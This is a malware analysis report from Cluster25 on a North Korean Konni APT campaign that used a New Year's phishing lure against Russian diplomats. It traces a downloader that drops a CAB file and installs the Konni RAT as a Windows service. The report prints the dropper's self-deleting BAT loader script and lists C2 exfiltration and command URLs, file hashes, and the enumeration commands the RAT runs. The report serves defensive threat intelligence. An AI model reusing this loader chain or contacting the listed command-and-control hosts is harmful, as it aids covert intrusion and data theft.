EXECUTIVE SUMMARY
Cluster25 analyzed a recent attack linked to the
North Korean APT group “Konni” targeting
Russian diplomatic sector using a spear phishing
theme for New Year's Eve festivities as lure. Once
the malicious email attachment is opened and
executed, a chain composed by multiple stages is
triggered, allowing actor to install an implant
belonging to the Konni RAT family as final
payload.

01 KILLCHAIN OVERVIEW
The following diagram shows the overall phases used by the actor to infect the target. The
malicious activity starts from an email containing a malicious zip file, which once decompressed
drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni
RAT malware, named scrnsvc.dll, as Windows service.

02 INITIAL ACCESS
C25 has traced an activity that started at least from August 2021 aimed at Russian targets
operating in the diplomatic sector.

On December 20th emails crafted to infect the Russian embassy located in Indonesia have been
detected; these emails used the New Year Eve 2022 festivity as decoy theme. Contrary to its
past actions, the North Korean APT group this time did not use malicious documents as
attachments; instead, they attached a .zip file type named “поздравление.zip”, which means
“congratulation” in Russian, containing an embedded executable representing the first stage of
the infection. The emails were spoofed using a *@mid.ru account as a sender to pretend that it
was sent from the Russian Embassy in Serbia.

03 DOWNLOADER ANALYSIS
The artifact found and extracted from the zip is a Windows x32 executable, named
“поздравление.scr” and compiled in date Mon Dec 20 09:16:02 2021. From the recent
compilation date, it seems to have been developed specifically for the attack under analysis, and
it can be identified by the following hash:

The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate
scrnsave.scr Windows application. When executed, it drops under the %TEMP% directory an
image named Happy.jpg (which is embedded in the resource section) and opens it as a
foreground window to trick the victim into believing that it is a legitimate Russian themed happy
holidays screensaver.

Subsequently, in the background, the malware starts its malicious activities by downloading the
next stage payload from an HTTP GET request to the Command-and-Control domain
i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756
and a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-andControl Apache webserver response was configured to respond with HTTP status code 401,
having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks),
returning as a response, in any case, a compressed CAB file encoded in base64 visible in the
evidence below.

After the CAB downloading, the malware starts the file decompression using expand.exe process
logging a file named - a.log - when the decompression is finished. The following image illustrates
the snipped of code described.

To optimize the time wasted during CAB decompression, the malware writes and executes the
following BAT file into the %TEMP% directory, which was contained in the data section encoded
in base64:

CODE
@ECHO OFF
CD /D %TEMP%
: WAITING
TIMEOUT /T 1
IF NOT EXIST "A.LOG" (GOTO WAITING)
DEL /F /Q "A.LOG"
INSTALL.BAT
DEL /F /Q "%~DPNX0”

The script’s scope is to wait for the decompression to finish by using the creation of a.log file as
flag and automatically execute the content of the CAB extraction, which is the install.bat file (one
of the files contained into the CAB), and finally delete itself using "%~DPNX0”, a bat script
convention used to specify the BAT file itself. As previously described the CAB file’s
decompressed content contains the following files:


Install.bat



scrnsvc.ini



scrnsvc.dll

Install.bat file is the launcher of the next stage infection, which hides the tracks of the previous
activities by moving all the files into the System32 directory and installing and starting the final

implant scrnsvc.dll as a Windows service named ScreenSaver Management Service, which,
when registered, loads the configuration file scrnvsvc.ini. The Windows service is installed by
configuring svchost.exe as a process container of the DLL executable representing Konni RAT
malware. Install.bat has already been seen among the TTPs belonging to this threat actor, which
content is visible below, where, in this case, it appears to have been slightly modified, and therefore
more likely to deceive detection signatures referring to files used in previous intrusions.

04 KONNI RAT ANALYSIS
The following Konni Rat version is a x64 DLL executable, which has as compile timestamp Mon
Dec 20 09:02:38 2021 - UTC, same date of the downloader, and where the payload is contained
in its export function ServiceMain and is directly invoked when registered as Windows service.
Cluster25 retrieved two different samples of the same Konni version identified by the following
hashes:

SHA256

cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5
8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83

Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to
interface with the infected operating system's file system and to communicate with the control
and monitoring server. The exported functions loaded belong to the following libraries:


kernel32.dll



advapi23.dll



urlmon.dll

2022 // © Cluster25



wininet.dll



shell32.dll

It then creates a pointer memory structure used to store the configuration used by the malware
during execution, which contains information such as the name of the computer, the time of
seconds to remain asleep, the domain used to communicate with the adversary command and
control, and all the information collected during the future enumeration. The configuration
structure is then passed as argument at a new thread created which is used as main routine by the
malware to perform the network communications and exfiltration, as visible in the following code
snippet.

The thread starts verifying if there is Internet connection available, remaining in sleep if not, then
adds the value 65001 into the Registry key in Console Codepage, to make Unicode character set
in cmd.exe by default, and collects data:


Enumerated

cached

website

via

FindFirstUrlCacheEntryW

and

FindNextUrlCacheEntryW


Enumerated operating system information using cmd /c systeminfo



Enumerated processes using cmd /c tasklist.exe

Once the enumeration has been completed, it stores all the info into temporary files which will then
be converted into a CAB file using cmd /c makecab and furtherly encrypted and sent to the
attacker

server

via

HTTP

POST

request

body

to

hxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME%, passing the operating
system computer name as parameter as evidences in the network dump reported following:

If the server response does not contain the string “success!” the malware tries to resend the
request, or it starts to send HTTP GET loop requests to receive commands from the server located
at hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt. The commands
received are parsed from the response and, if containing the character ”>” are executed via
CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid
exceptions during output redirection of the file writing, being the sample located in System32
folder), otherwise using the CreateProcessW function.

At the time of the analysis the server was up but it did not provide the commands to be executed,
probably because the actor set up the Command and Control backend with some form of
geofencing validation.

05 ATTRIBUTION
Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean
group known as Konni. Konni is also the name of their custom RAT which presents intelligence
gathering features. In this case the final implant is a new version of Konni RAT having code and
behavioral similarities with its previous versions. The reported kill-chain shows overlaps with the
TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file
to automatically install Konni RAT as a service. Identifiable modifications are evident in the pattern
used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.

Finally, it is possible to notice the use of "ZETTA HOSTING SOLUTIONS LLC" (AS44476) as
hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the
Command and Controls hostnames. Specifically, atwebpages dot com appears to be commonly
observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.
